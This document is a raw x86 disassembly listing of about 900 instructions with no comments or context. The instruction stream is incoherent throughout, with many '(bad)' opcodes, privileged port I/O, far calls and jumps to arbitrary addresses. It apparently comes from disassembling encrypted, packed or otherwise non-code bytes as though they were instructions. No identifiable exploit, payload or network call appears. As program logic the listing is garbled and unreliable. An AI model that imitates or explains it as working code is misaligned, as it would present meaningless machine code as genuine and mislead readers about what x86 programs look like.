  413ef4:	arpl   WORD PTR [edi-0x5a55f3e5],bp
  413efa:	out    0x96,eax
  413efc:	push   ds
  413efd:	std    
  413efe:	push   ebx
  413eff:	lahf   
  413f00:	loop   0x413ebf
  413f02:	fisttp DWORD PTR [ebx]
  413f04:	pop    ebx
  413f05:	push   0xf092cf0d
  413f0a:	repnz xchg ebx,edi
  413f0d:	dec    ebp
  413f0e:	sahf   
  413f0f:	data16 mov fs,WORD PTR [esi-0x6f]
  413f13:	fidivr WORD PTR [esi+0x1e6b2e3f]
  413f19:	jno    0x413ebf
  413f1b:	test   DWORD PTR [edi-0x78],0xbd4229a2
  413f22:	das    
  413f23:	icebp  
  413f24:	lods   al,BYTE PTR ds:[esi]
  413f25:	jle    0x413ee3
  413f27:	ret    0x87eb
  413f2a:	inc    edx
  413f2b:	push   ds
  413f2c:	pop    ebp
  413f2d:	xor    DWORD PTR ds:0x5b79c6b2,edi
  413f33:	cmp    al,0xb8
  413f35:	daa    
  413f36:	fld    DWORD PTR [eax+0x5]
  413f39:	not    DWORD PTR [ebp-0x72]
  413f3c:	jmp    0x2db861f0
  413f41:	dec    ebx
  413f42:	cs cld 
  413f44:	add    al,0x99
  413f46:	xor    edi,ebp
  413f48:	mov    al,0xd9
  413f4a:	inc    esi
  413f4b:	lahf   
  413f4c:	inc    esi
  413f4d:	loop   0x413f41
  413f4f:	jl     0x413fc8
  413f51:	ret    
  413f52:	out    dx,al
  413f53:	(bad)  [ecx-0x37]
  413f56:	inc    edx
  413f57:	lods   eax,DWORD PTR gs:[esi]
  413f59:	(bad)  
  413f5a:	push   ecx
  413f5b:	loope  0x413ede
  413f5d:	mov    DWORD PTR [ecx+esi*1-0x54],0x708f0c09
  413f65:	jmp    0xb4c1f400
  413f6a:	dec    edx
  413f6b:	stos   BYTE PTR es:[edi],al
  413f6c:	mov    bl,0x79
  413f6e:	idiv   DWORD PTR [edx+edi*4]
  413f71:	and    BYTE PTR [esi-0x6],al
  413f74:	mov    eax,ds:0x33bb9114
  413f79:	inc    ecx
  413f7a:	cdq    
  413f7b:	mov    ah,0xbd
  413f7d:	lock dec eax
  413f7f:	sbb    edi,edi
  413f81:	xchg   ebx,eax
  413f82:	pop    ds
  413f83:	xchg   edi,eax
  413f84:	and    BYTE PTR [ebp+0x3ac04b83],0xec
  413f8b:	(bad)  [esi]
  413f8d:	pop    es
  413f8e:	sub    DWORD PTR [ebx],edi
  413f90:	aad    0x12
  413f92:	mov    dl,ch
  413f94:	push   esi
  413f95:	xor    eax,DWORD PTR [edi+eax*1-0x5c]
  413f99:	loopne 0x413f8e
  413f9b:	xor    al,0x9c
  413f9d:	enter  0x8874,0xbb
  413fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa2:	xor    esi,DWORD PTR [ebp-0x214105a4]
  413fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa9:	fwait
  413faa:	jns    0x413f6b
  413fac:	bound  ecx,QWORD PTR [eax]
  413fae:	je     0x414000
  413fb0:	repz test eax,0x7fc08994
  413fb6:	rcr    BYTE PTR [edx-0x80],cl
  413fb9:	inc    eax
  413fba:	push   ebx
  413fbb:	mov    dl,0x53
  413fbd:	pop    ebp
  413fbe:	xor    esp,DWORD PTR [edi]
  413fc0:	imul   ecx,DWORD PTR [edx+0x71],0xffffffcf
  413fc4:	arpl   WORD PTR [eax],cx
  413fc6:	cmp    al,0xa
  413fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc9:	pop    ebp
  413fca:	xchg   edx,eax
  413fcb:	jne    0x413f64
  413fcd:	adc    ebx,edx
  413fcf:	jmp    0x413fae
  413fd1:	mov    ds:0xdc7baa0,eax
  413fd6:	retf   
  413fd7:	int    0x45
  413fd9:	das    
  413fda:	jmp    0xea514cfa
  413fdf:	inc    edi
  413fe0:	dec    ebp
  413fe1:	cmc    
  413fe2:	imul   ebx,DWORD PTR ds:0xfd60374b,0xffffffc9
  413fe9:	dec    edi
  413fea:	leave  
  413feb:	icebp  
  413fec:	xor    eax,0x2328f3f
  413ff1:	jns    0x413fe5
  413ff3:	push   esi
  413ff4:	or     al,0x1c
  413ff6:	into   
  413ff7:	xlat   BYTE PTR ds:[ebx]
  413ff8:	or     al,0x27
  413ffa:	jle    0x414026
  413ffc:	lods   al,BYTE PTR ds:[esi]
  413ffd:	(bad)  
  413ffe:	jnp    0x41406e
  414000:	outs   dx,BYTE PTR ds:[esi]
  414001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414002:	loopne 0x41406b
  414004:	ror    DWORD PTR [edx+0x4b],0xc3
  414008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414009:	loop   0x41406d
  41400b:	retf   
  41400c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41400d:	mov    al,0xec
  41400f:	test   esp,0x3341475f
  414015:	lock aam 0xfb
  414018:	loop   0x413fc8
  41401a:	or     BYTE PTR [ecx+ebx*1+0x55],cl
  41401e:	push   edx
  41401f:	mov    ebx,0x3591139b
  414024:	in     eax,0x98
  414026:	add    DWORD PTR [ecx-0x3c23ff26],esi
  41402c:	and    eax,0x38d095d4
  414031:	jb     0x413fb8
  414033:	leave  
  414034:	aad    0x22
  414036:	pop    edx
  414037:	push   esi
  414038:	pusha  
  414039:	retf   0x5f40
  41403c:	push   ebx
  41403d:	aas    
  41403e:	xchg   edi,eax
  41403f:	popa   
  414040:	push   edx
  414041:	test   BYTE PTR [ebx-0x7d861c17],bh
  414047:	jb     0x414036
  414049:	jno    0x41400d
  41404b:	iret   
  41404c:	mov    edx,0x5943e953
  414051:	dec    esi
  414052:	ret    0x2129
  414055:	add    al,0xae
  414057:	or     BYTE PTR [edx+0x15c6950],ah
  41405d:	sub    eax,0x2f1be7a8
  414062:	shr    ah,0xe6
  414065:	pop    es
  414066:	pop    ebx
  414067:	call   0xeb32:0x3c76509b
  41406e:	or     cl,BYTE PTR [eax]
  414070:	ss adc bl,bh
  414073:	bound  esp,QWORD PTR [esi-0x2b02cb4]
  414079:	mov    bl,0xe9
  41407b:	std    
  41407c:	sti    
  41407d:	int3   
  41407e:	and    al,0x96
  414080:	shl    BYTE PTR [edx],cl
  414082:	dec    eax
  414083:	adc    esp,DWORD PTR [esi-0x613857c1]
  414089:	sub    esi,edi
  41408b:	mov    dh,0xf4
  41408d:	unpckhps xmm6,xmm5
  414090:	test   BYTE PTR [ebp+0x3dfb1205],ch
  414096:	addr16 or eax,0xfb1e6794
  41409c:	fld    QWORD PTR cs:[edx]
  41409f:	push   edx
  4140a0:	xor    BYTE PTR [ebp-0x2aaab355],dh
  4140a6:	scas   eax,DWORD PTR es:[edi]
  4140a7:	mov    ebx,0x1c81941a
  4140ac:	xor    eax,0x904e0176
  4140b1:	fs add al,0xe5
  4140b5:	call   0x5331:0x47d35131
  4140bc:	adc    BYTE PTR [eax-0x159886a7],ah
  4140c2:	gs enter 0x5138,0x46
  4140c7:	and    ch,BYTE PTR [edx-0x19]
  4140ca:	cld    
  4140cb:	xchg   edi,eax
  4140cc:	pushf  
  4140cd:	mov    ebp,0x7090e55b
  4140d2:	shl    BYTE PTR [esi+0xe948206],1
  4140d8:	jb     0x414120
  4140da:	call   0x1deb:0xfdfe744b
  4140e1:	cmp    DWORD PTR [ebx-0x2c4ed03],edi
  4140e7:	add    ch,al
  4140e9:	dec    edx
  4140ea:	xor    al,0x5b
  4140ec:	sti    
  4140ed:	ret    
  4140ee:	and    eax,0x29b386e9
  4140f3:	clc    
  4140f4:	scas   eax,DWORD PTR es:[edi]
  4140f5:	mov    WORD PTR [ecx],fs
  4140f7:	mov    ebp,0xf7b31af0
  4140fc:	stos   DWORD PTR es:[edi],eax
  4140fd:	mov    bh,0x9b
  4140ff:	push   edi
  414100:	arpl   WORD PTR [eax],cx
  414102:	outs   dx,DWORD PTR ds:[esi]
  414103:	(bad)  
  414105:	and    al,BYTE PTR [eax]
  414107:	inc    ecx
  414108:	push   esi
  414109:	jp     0x41416d
  41410b:	pop    esi
  41410c:	jnp    0x414106
  41410e:	scas   al,BYTE PTR es:[edi]
  41410f:	gs mov ebx,0xdea314b6
  414115:	pop    ecx
  414116:	mov    DWORD PTR [edx*8-0x7bf06f1a],0xfcb8a1
  414121:	dec    esp
  414122:	popf   
  414123:	mov    ah,0xef
  414125:	aaa    
  414126:	pop    edi
  414127:	stos   DWORD PTR es:[edi],eax
  414128:	add    dl,BYTE PTR [ebx+eax*2-0x46]
  41412c:	xor    DWORD PTR [esi],esi
  41412e:	or     eax,0x2ed4e352
  414133:	(bad)  
  414134:	cmp    BYTE PTR [edx+0x57be1900],al
  41413a:	sub    edx,esp
  41413c:	cmp    eax,DWORD PTR [ebx-0x28]
  41413f:	xor    ebx,ebx
  414141:	lds    ebp,FWORD PTR [ecx-0x4e4d2938]
  414147:	mov    ds:0xeca739b0,eax
  41414c:	cmp    eax,0xfe103f67
  414151:	icebp  
  414152:	and    al,0x77
  414154:	pop    ebx
  414155:	dec    ebx
  414156:	test   DWORD PTR [edx],edi
  414158:	int3   
  414159:	or     eax,0x585d30f5
  41415e:	dec    ecx
  41415f:	add    ebx,esi
  414161:	push   esi
  414162:	into   
  414163:	dec    ecx
  414164:	xor    ecx,DWORD PTR [ebx-0x1a]
  414167:	jl     0x4141e6
  414169:	sahf   
  41416a:	jo     0x41416c
  41416c:	cdq    
  41416d:	aaa    
  41416e:	jns    0x414186
  414170:	lock (bad) 
  414172:	loop   0x4141ab
  414174:	jns    0x4141c8
  414176:	pop    edi
  414177:	stos   BYTE PTR es:[edi],al
  414178:	push   edi
  414179:	adc    DWORD PTR [edi+0x19],edx
  41417c:	xchg   esp,eax
  41417d:	dec    ebx
  41417e:	sbb    esi,esp
  414180:	jg     0x41414f
  414182:	sub    DWORD PTR [ecx+0x2388e6b3],eax
  414188:	xchg   esp,eax
  414189:	mov    DWORD PTR [eax+0x43da9df2],esi
  41418f:	mov    fs:0x5c0ffb16,al
  414195:	div    DWORD PTR [ebx]
  414197:	es inc esp
  414199:	rcr    BYTE PTR [edi+eiz*2-0x7053076e],cl
  4141a0:	int    0x3b
  4141a2:	cdq    
  4141a3:	dec    edi
  4141a4:	bound  eax,QWORD PTR [ecx]
  4141a6:	popa   
  4141a7:	jae    0x41415c
  4141a9:	sti    
  4141aa:	push   edx
  4141ab:	push   esp
  4141ac:	imul   esi,DWORD PTR [esi-0x28e6f863],0x9058313a
  4141b6:	stos   BYTE PTR es:[edi],al
  4141b7:	sbb    eax,0xe825d1cb
  4141bc:	fwait
  4141bd:	(bad)  
  4141be:	out    dx,eax
  4141bf:	rcr    DWORD PTR [ecx+0x651565ee],cl
  4141c5:	mov    ebx,0x8221dd2d
  4141ca:	les    esi,FWORD PTR [ebp*8+0x68e49a4c]
  4141d1:	out    0x41,eax
  4141d3:	sbb    eax,0x16c3b126
  4141d8:	clc    
  4141d9:	lock or DWORD PTR [ebx-0x21],ebx
  4141dd:	adc    BYTE PTR [edi+0x6c],ch
  4141e0:	jne    0x4141ce
  4141e2:	fiadd  WORD PTR [ebp+eax*2+0x52377d5b]
  4141e9:	sub    al,0xfb
  4141eb:	pop    ebp
  4141ec:	and    eax,0xa0311541
  4141f1:	inc    edi
  4141f2:	push   ds
  4141f3:	mov    dh,0x70
  4141f5:	xchg   ebx,eax
  4141f6:	test   DWORD PTR [ebx+0x27248837],edi
  4141fc:	sbb    ch,BYTE PTR [edi-0x4035ece8]
  414202:	loopne 0x414200
  414204:	xchg   edx,eax
  414205:	aas    
  414206:	popf   
  414207:	add    al,0x49
  414209:	sahf   
  41420a:	stc    
  41420b:	jo     0x414266
  41420d:	xchg   esp,eax
  41420e:	(bad)  
  414210:	ret    
  414211:	push   ecx
  414212:	mov    ss,ebp
  414214:	mov    ah,0xa3
  414216:	pusha  
  414217:	lock adc eax,0x633bd963
  41421d:	xchg   DWORD PTR [ebx+esi*2+0x45067ff9],ecx
  414224:	test   BYTE PTR [eax+ebx*1-0x2d],bl
  414228:	add    dh,BYTE PTR [esi]
  41422a:	ret    
  41422b:	jg     0x41425b
  41422d:	jno    0x4141ed
  41422f:	stos   DWORD PTR es:[edi],eax
  414230:	push   ebp
  414231:	mov    ecx,0x9357a726
  414236:	inc    edx
  414237:	add    esp,edi
  414239:	jae    0x414283
  41423b:	popa   
  41423c:	loopne 0x4141f9
  41423e:	call   0x7c74d8c2
  414243:	dec    ebx
  414244:	sub    DWORD PTR [ecx-0x5a],esi
  414247:	adc    bh,BYTE PTR [ebp+0x6564448]
  41424d:	mov    DWORD PTR [esp+eax*8-0x1f],0x7cd84d9b
  414255:	loope  0x41422b
  414257:	pop    ebx
  414258:	jp     0x414221
  41425a:	jne    0x4142cd
  41425c:	cmp    ebx,DWORD PTR [ecx+eax*4]
  41425f:	into   
  414260:	and    eax,0x57b7f86c
  414265:	sar    cl,cl
  414267:	dec    eax
  414268:	and    BYTE PTR [ecx],cl
  41426a:	xor    eax,0xd7f61fe5
  41426f:	retf   0xb5fc
  414272:	dec    ebp
  414273:	xor    eax,0xf236f23a
  414278:	inc    eax
  414279:	sub    eax,0x4cdae179
  41427e:	ins    DWORD PTR es:[edi],dx
  41427f:	push   ds
  414280:	std    
  414281:	sbb    ebp,DWORD PTR [ebx+0x5571e059]
  414287:	inc    edi
  414288:	mov    ebp,0x737a770b
  41428d:	mov    ah,0xee
  41428f:	addr16 cmc 
  414291:	dec    esp
  414292:	int3   
  414293:	mov    eax,0x64354a92
  414298:	adc    al,BYTE PTR [eax-0x5a3ee503]
  41429e:	dec    esp
  41429f:	or     cl,dl
  4142a1:	arpl   bx,sp
  4142a3:	mov    bh,BYTE PTR [ecx+0x17ad0505]
  4142a9:	sub    esi,esi
  4142ab:	jmp    0x5126075f
  4142b0:	cdq    
  4142b1:	fistp  DWORD PTR [edx+0xa107d81]
  4142b7:	mov    ch,0x5c
  4142b9:	call   0x60f:0x357ebba7
  4142c0:	sub    bl,0x73
  4142c3:	dec    ebx
  4142c4:	pop    ecx
  4142c5:	push   eax
  4142c6:	mov    dh,0x89
  4142c8:	js     0x414321
  4142ca:	or     al,0xef
  4142cc:	in     al,0xe7
  4142ce:	je     0x41429c
  4142d0:	mov    ds:0x1794a412,al
  4142d5:	xor    BYTE PTR [ecx-0x62239dbb],cl
  4142db:	iret   
  4142dc:	daa    
  4142dd:	scas   eax,DWORD PTR es:[edi]
  4142de:	ror    cl,cl
  4142e0:	dec    ebp
  4142e1:	cmp    BYTE PTR [ebx-0x3be72367],0x44
  4142e8:	std    
  4142e9:	outs   dx,DWORD PTR ds:[esi]
  4142ea:	dec    edx
  4142eb:	adc    edx,esp
  4142ed:	icebp  
  4142ee:	sub    ebp,DWORD PTR [edi]
  4142f0:	in     eax,dx
  4142f1:	xchg   DWORD PTR [ebp+0x54],edi
  4142f4:	sub    al,0x5c
  4142f6:	pop    esi
  4142f7:	icebp  
  4142f8:	xor    DWORD PTR [ebp-0x3e912399],0xffffff82
  4142ff:	out    dx,al
  414300:	outs   dx,DWORD PTR ds:[esi]
  414301:	outs   dx,BYTE PTR ds:[esi]
  414302:	stc    
  414303:	fbstp  TBYTE PTR [edi-0x4f7e5e56]
  414309:	xchg   edx,eax
  41430a:	in     al,0x45
  41430c:	clc    
  41430d:	cmp    eax,0x3653af6d
  414312:	out    dx,eax
  414313:	pop    edi
  414314:	jbe    0x41433f
  414316:	jecxz  0x4142e8
  414318:	jmp    0x414359
  41431a:	and    DWORD PTR [eax+edx*1+0x18],ebp
  41431e:	inc    ebx
  41431f:	popa   
  414320:	mov    dl,dl
  414322:	and    al,0x4c
  414324:	or     ah,BYTE PTR [edx]
  414326:	or     DWORD PTR [ecx+0x5f],edx
  414329:	aas    
  41432a:	popa   
  41432b:	jl     0x414379
  41432d:	lea    edi,[ebp+0x74]
  414330:	push   ds
  414331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414332:	add    eax,0xc1e009b5
  414337:	push   ecx
  414338:	dec    edi
  414339:	aam    0xf6
  41433b:	sbb    BYTE PTR [ecx+eiz*4+0x29],dl
  41433f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414341:	jae    0x4143be
  414343:	retf   
  414344:	pusha  
  414345:	es xchg edx,eax
  414347:	mov    ?,WORD PTR [edi+0x48]
  41434a:	jmp    0x9b2a2633
  41434f:	cmp    ah,dl
  414351:	nop
  414352:	cmp    BYTE PTR fs:[eax+edi*2+0x18],ch
  414357:	jne    0x414366
  414359:	cdq    
  41435a:	pop    ss
  41435b:	ror    BYTE PTR [ebx-0x43f12c64],cl
  414361:	and    bl,BYTE PTR [edi+eax*8]
  414364:	mov    esp,0x9e54d75a
  414369:	aam    0x58
  41436b:	and    bl,BYTE PTR [edx]
  41436d:	and    ebp,DWORD PTR [edi+ebp*2+0x49]
  414371:	arpl   WORD PTR [eax+edx*1-0x3e],dx
  414375:	fisttp WORD PTR [esi-0x25]
  414378:	cmc    
  414379:	mov    dl,0xe8
  41437b:	loope  0x41432f
  41437d:	push   0x6b
  41437f:	xor    al,BYTE PTR [ebp-0x49]
  414382:	and    esp,DWORD PTR [esi-0x54153bae]
  414388:	jmp    0x414357
  41438a:	mov    es,ecx
  41438c:	out    dx,al
  41438d:	in     eax,dx
  41438e:	and    ch,0x23
  414391:	jbe    0x41435d
  414393:	ss lahf 
  414395:	in     al,0x5d
  414397:	in     eax,0xeb
  414399:	inc    eax
  41439a:	jecxz  0x414348
  41439c:	pop    edi
  41439d:	jns    0x4143b7
  41439f:	mov    bl,0x57
  4143a1:	xchg   ebp,eax
  4143a2:	mov    cl,BYTE PTR [edi]
  4143a4:	push   ecx
  4143a5:	sbb    BYTE PTR [ebx],0x2f
  4143a8:	mov    ah,0x9
  4143aa:	jp     0x414355
  4143ac:	jmp    0x414421
  4143ae:	scas   al,BYTE PTR es:[edi]
  4143af:	mov    ?,edi
  4143b1:	sbb    BYTE PTR [ebx+0x5a86e998],ah
  4143b7:	aad    0xa2
  4143b9:	adc    ecx,DWORD PTR [ecx+0x13]
  4143bc:	fneni(8087 only) 
  4143be:	jecxz  0x414386
  4143c0:	(bad)  
  4143c1:	xor    al,0xa9
  4143c3:	call   0xe515:0xd2440e1c
  4143ca:	and    esp,0xdeaa39b1
  4143d0:	pop    ebx
  4143d1:	cmp    al,BYTE PTR [eax-0x24]
  4143d4:	mov    ch,0x59
  4143d6:	shl    dl,1
  4143d8:	mov    cl,BYTE PTR [ecx-0x24]
  4143db:	sub    dh,BYTE PTR [edi]
  4143dd:	jecxz  0x41436c
  4143df:	out    0x44,al
  4143e1:	push   0xffffffe6
  4143e3:	call   0x9e7027ad
  4143e8:	imul   ebp,DWORD PTR [ebx-0x1d],0xffffffe4
  4143ec:	das    
  4143ed:	adc    ebp,eax
  4143ef:	(bad)  
  4143f0:	dec    edx
  4143f1:	sub    DWORD PTR [eax],0xb927372c
  4143f7:	inc    ecx
  4143f8:	sub    eax,0x69ee6773
  4143fd:	fnstcw WORD PTR [edx-0x19a6b76f]
  414403:	xchg   ebx,eax
  414404:	pushf  
  414405:	inc    esi
  414406:	inc    edx
  414407:	push   ebp
  414408:	test   DWORD PTR cs:[eax+0x61ac57a9],ebp
  41440f:	add    al,0x8
  414411:	(bad)  
  414412:	sbb    cl,BYTE PTR [edi+0x3a]
  414415:	popa   
  414416:	stc    
  414417:	sbb    BYTE PTR [edx+ebp*1+0x2724b108],ch
  41441e:	addr16 pop edx
  414420:	sub    bh,dh
  414422:	js     0x414409
  414424:	cmp    al,0x3c
  414426:	imul   ecx,DWORD PTR ds:0xf9cc0fef,0x2de734ca
  414430:	(bad)  
  414431:	test   DWORD PTR [esi+0x56],0x21ab30d7
  414438:	mov    esi,0x10555a97
  41443d:	(bad)  
  41443e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41443f:	icebp  
  414440:	xor    DWORD PTR [esi],0xf3a399ce
  414446:	jns    0x414456
  414448:	clc    
  414449:	sbb    ebp,DWORD PTR [esi]
  41444b:	orps   xmm5,xmm0
  41444e:	mov    eax,0x9e6d4fb1
  414453:	sbb    BYTE PTR [edi+0x73ee3c0],bl
  414459:	in     eax,dx
  41445a:	xchg   ebp,eax
  41445b:	ret    0xad1
  41445e:	sub    eax,0x78257754
  414463:	mov    esp,DWORD PTR [edi+0x61425dea]
  414469:	sub    eax,0xca8d00c2
  41446e:	push   es
  41446f:	daa    
  414470:	lds    edi,FWORD PTR [ecx+0x6fd04dce]
  414476:	pop    es
  414477:	or     esi,ebp
  414479:	fst    DWORD PTR [ebx+0x3e9a6b9e]
  41447f:	lods   eax,DWORD PTR ds:[esi]
  414480:	push   cs
  414481:	and    al,0xb2
  414483:	inc    edi
  414484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414485:	imul   ebp,DWORD PTR ds:0x511744c1
  41448c:	ins    DWORD PTR es:[edi],dx
  41448d:	or     eax,0xf8023b60
  414492:	pop    ebp
  414493:	inc    eax
  414494:	mov    dl,0xcf
  414496:	nop
  414497:	cmp    BYTE PTR [esi+0x42],0xc2
  41449b:	jnp    0x414494
  41449d:	xlat   BYTE PTR ds:[ebx]
  41449e:	je     0x41443d
  4144a0:	cmp    eax,0xa67bf07d
  4144a5:	jno    0x414440
  4144a7:	mov    ds:0x43749422,al
  4144ac:	mov    al,0x70
  4144ae:	dec    ebx
  4144af:	in     al,dx
  4144b0:	adc    BYTE PTR [eax],ch
  4144b2:	pop    ebp
  4144b3:	xor    BYTE PTR [ebx-0x33ebea04],dl
  4144b9:	xchg   edx,eax
  4144ba:	out    dx,al
  4144bb:	push   ss
  4144bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144bd:	out    0x56,al
  4144bf:	pop    ecx
  4144c0:	adc    bh,BYTE PTR [eax-0x10]
  4144c3:	test   al,0xec
  4144c5:	sar    BYTE PTR [esi+0x5e0e31d0],1
  4144cb:	in     eax,dx
  4144cc:	mov    edi,0x92382715
  4144d1:	cli    
  4144d2:	iret   
  4144d3:	xchg   edx,eax
  4144d4:	cdq    
  4144d5:	cmp    al,BYTE PTR [eax+0x50]
  4144d8:	out    dx,al
  4144d9:	and    al,0xa5
  4144db:	jg     0x4144be
  4144dd:	pop    ds
  4144de:	push   edi
  4144df:	inc    ebx
  4144e0:	pop    ebx
  4144e1:	xchg   BYTE PTR [ecx+0x789f8b79],al
  4144e7:	jbe    0x414491
  4144e9:	pop    edx
  4144ea:	iret   
  4144eb:	xor    BYTE PTR [edx],bh
  4144ed:	repnz dec edx
  4144ef:	cmp    dh,BYTE PTR [ebx+0x47352830]
  4144f5:	mov    eax,0x415b2a3
  4144fa:	push   ds
  4144fb:	jne    0x414487
  4144fd:	out    0x25,eax
  4144ff:	dec    ebx
  414500:	jb     0x414577
  414502:	push   0x1d
  414504:	repnz dec esp
  414506:	cmp    dh,al
  414508:	push   cs
  414509:	shl    BYTE PTR [edi+0x6e92fbd5],0x1d
  414510:	cmp    ebp,0xb9ba11c
  414516:	or     edx,ebx
  414518:	mov    ecx,eax
  41451a:	pop    ebp
  41451b:	fisttp QWORD PTR [eax+0x17e82b02]
  414521:	bound  edi,QWORD PTR [ecx-0x28]
  414524:	out    dx,al
  414525:	in     eax,0x5f
  414527:	mov    edx,DWORD PTR [eax]
  414529:	sub    DWORD PTR [edi-0x315fd722],ecx
  41452f:	aas    
  414530:	mov    edi,0x793520e2
  414535:	cmp    dl,BYTE PTR [eax-0xe1a472e]
  41453b:	sbb    dh,BYTE PTR [ebx-0x422c8901]
  414541:	cld    
  414542:	aas    
  414543:	and    DWORD PTR [eax+esi*1],eax
  414546:	push   ebx
  414547:	es pop esp
  414549:	pop    ebp
  41454a:	cmp    eax,DWORD PTR [esi+0xb]
  41454d:	dec    ebx
  41454e:	int    0x8f
  414550:	and    esp,ecx
  414552:	fidivr WORD PTR [edi+0x7d95a729]
  414558:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41455a:	outs   dx,DWORD PTR ds:[esi]
  41455b:	sar    DWORD PTR [ebx+edi*8+0x32],cl
  41455f:	inc    ebx
  414560:	jno    0x4145e1
  414562:	cmp    dl,BYTE PTR [edi+esi*4]
  414565:	pop    edx
  414566:	cwde   
  414567:	fcomp  DWORD PTR [ebx]
  414569:	and    al,0x26
  41456b:	jge    0x414502
  41456d:	jmp    0xd338:0xea9cf963
  414574:	addr16 xchg ecx,eax
  414576:	sbb    edi,DWORD PTR cs:[ebx-0x4b49396f]
  41457d:	push   0xffffffb5
  41457f:	xlat   BYTE PTR ds:[ebx]
  414580:	push   ecx
  414581:	mov    ch,0xe4
  414583:	and    ebp,DWORD PTR [ecx+0x58988a3b]
  414589:	rcl    BYTE PTR [ebp-0x6ebecb59],0xee
  414590:	mov    ds:0xd68f10c2,eax
  414595:	fwait
  414596:	pop    esp
  414597:	test   edx,eax
  414599:	adc    esi,ecx
  41459b:	imul   ebx,DWORD PTR [edx+eax*2],0xffffffb6
  41459f:	ret    0x3d89
  4145a2:	pop    ds
  4145a3:	mov    ds:0xf6cc546d,eax
  4145a8:	cmpxchg BYTE PTR [edx],ch
  4145ab:	jbe    0x4145ba
  4145ad:	aad    0xcd
  4145af:	mov    ecx,0x16502aa0
  4145b4:	mov    ecx,0xa47328b6
  4145b9:	xchg   DWORD PTR [eax],ebp
  4145bb:	retf   0x8621
  4145be:	ror    DWORD PTR [edi+0x7c],0xbe
  4145c2:	or     DWORD PTR [ebx],0x24338631
  4145c8:	shl    esp,cl
  4145ca:	outs   dx,BYTE PTR ds:[esi]
  4145cb:	mov    ch,0xe9
  4145cd:	xchg   ecx,eax
  4145ce:	cmp    eax,0x3aaf5384
  4145d3:	xchg   esi,eax
  4145d4:	cdq    
  4145d5:	ja     0x41464b
  4145d7:	jno    0x4145a9
  4145d9:	pop    esp
  4145da:	cwde   
  4145db:	push   ebp
  4145dc:	sub    ch,BYTE PTR [eax]
  4145de:	push   edx
  4145df:	xchg   BYTE PTR [esi-0x6e7d3326],bh
  4145e5:	or     eax,0x8d4b9074
  4145ea:	lods   al,BYTE PTR ds:[esi]
  4145eb:	icebp  
  4145ec:	xlat   BYTE PTR ds:[ebx]
  4145ed:	push   eax
  4145ee:	push   0x70f20c19
  4145f3:	ficomp WORD PTR [edx]
  4145f5:	or     DWORD PTR [ecx],esi
  4145f7:	int3   
  4145f8:	aam    0xc3
  4145fa:	ret    
  4145fb:	add    ebp,DWORD PTR [di]
  4145fe:	pop    edi
  4145ff:	jno    0x41461a
  414601:	sub    eax,0x5c888512
  414606:	imul   ecx,DWORD PTR [esi+0x469200b9],0x2d
  41460d:	mov    ch,0x38
  41460f:	(bad)  ds:0x4066c2ba
  414615:	lods   al,BYTE PTR ds:[esi]
  414616:	test   eax,0xf5876781
  41461b:	outs   dx,BYTE PTR ds:[esi]
  41461c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41461d:	int    0x12
  41461f:	pushf  
  414620:	ins    DWORD PTR es:[edi],dx
  414621:	ret    0x7aa1
  414624:	lahf   
  414625:	sub    eax,0x93d13776
  41462a:	sti    
  41462b:	das    
  41462c:	xchg   ebx,eax
  41462d:	xor    ecx,DWORD PTR [edx]
  41462f:	in     eax,0xb9
  414631:	or     eax,0xeaee0e9c
  414636:	cmp    al,0x35
  414638:	(bad)  
  414639:	aam    0x82
  41463b:	dec    esp
  41463c:	push   ecx
  41463d:	shr    al,1
  41463f:	mov    ecx,0x70fd94e5
  414644:	cmp    eax,0x3399ebac
  414649:	inc    ebx
  41464a:	inc    ebp
  41464b:	xor    dl,BYTE PTR [edx-0x39eea049]
  414651:	jb     0x414634
  414653:	add    BYTE PTR [esi],bl
  414655:	cs fwait
  414657:	mov    esp,edi
  414659:	mov    DWORD PTR [edi],esp
  41465b:	retf   
  41465c:	xchg   edi,eax
  41465d:	call   0xf1c642e8
  414662:	inc    esp
  414663:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  414665:	mov    dl,ah
  414667:	sbb    esi,ebp
  414669:	ins    BYTE PTR es:[edi],dx
  41466a:	dec    ecx
  41466b:	imul   ebp,DWORD PTR [ebp-0x80],0x16fb03a8
  414672:	xchg   BYTE PTR [ebx],cl
  414674:	ds cwde 
  414676:	xchg   edi,ebx
  414678:	mov    dh,0x64
  41467a:	dec    ebp
  41467b:	push   cs
  41467c:	sbb    ch,BYTE PTR [ebx+0x663792a0]
  414682:	aaa    
  414683:	mov    WORD PTR [ebp+0x70cd8825],gs
  414689:	mov    bl,BYTE PTR [ebx-0x42ee8238]
  41468f:	or     DWORD PTR [edi-0x14a8ba60],0x581d075d
  414699:	push   esp
  41469a:	dec    esi
  41469b:	cmp    esi,DWORD PTR ds:0x5b1937e2
  4146a1:	mov    DWORD PTR [edi+0x9],ebx
  4146a4:	adc    bl,al
  4146a6:	jmp    0x414699
  4146a8:	ins    BYTE PTR es:[edi],dx
  4146a9:	ror    BYTE PTR [edi],0xf1
  4146ac:	shl    DWORD PTR [ebp-0x3f3e2658],1
  4146b2:	cmc    
  4146b3:	and    edi,esp
  4146b5:	cdq    
  4146b6:	lds    edx,FWORD PTR [esi-0x5b]
  4146b9:	dec    ebp
  4146ba:	lock stos BYTE PTR es:[edi],al
  4146bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146bd:	pop    edi
  4146be:	inc    ebp
  4146bf:	jmp    0xcdaf:0xf1c3ba09
  4146c6:	xchg   edi,eax
  4146c7:	mov    bh,0x41
  4146c9:	ret    0x2108
  4146cc:	loope  0x4146fe
  4146ce:	ret    
  4146cf:	fs icebp 
